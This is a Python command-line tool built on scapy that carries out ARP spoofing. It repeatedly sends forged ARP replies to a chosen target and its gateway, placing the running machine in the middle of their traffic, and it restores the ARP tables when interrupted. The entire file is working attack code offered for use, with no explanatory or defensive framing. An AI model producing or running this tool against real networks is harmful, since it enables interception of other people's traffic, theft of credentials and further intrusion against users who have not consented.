#!/usr/bin/env python3
import scapy.all as scapy
import argparse
import time

def inputs():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="specify target ip address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="specify default gateway's ip")
    parser.add_argument("-i", "--interval", dest="interval", help="arp spoof packets send time interval (2 is default)", default=2)
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Please specify target ip address or -h for more help")
    if not options.gateway_ip:
        parser.error("Please specify gateway ip address or -h for more help")
    return options


def get_mac(target_ip):
    arp = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = broadcast / arp
    answered = scapy.srp(arp_request, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoofer(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def re_arping(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

try:
    packets_sent = 0
    while True:
        options = inputs()
        target_ip = options.target_ip
        gateway_ip = options.gateway_ip
        interval = int(options.interval)
        spoofer(target_ip, gateway_ip)
        spoofer(gateway_ip, target_ip)
        print(f"\rSpoofing {gateway_ip} and {target_ip}: Packets Sent=>" + str(packets_sent), end="")
        packets_sent += 2
        time.sleep(interval)
except KeyboardInterrupt:
    print("\nDetected CTRL+C\nExiting...")
    print("Re-Arping targets")
    re_arping(gateway_ip, target_ip)
    re_arping(target_ip, gateway_ip)
except IndexError:
    print("\nIP address does not exist\nOR there is no device on the specified ip address\nOR Did you turned on ip forwarding?")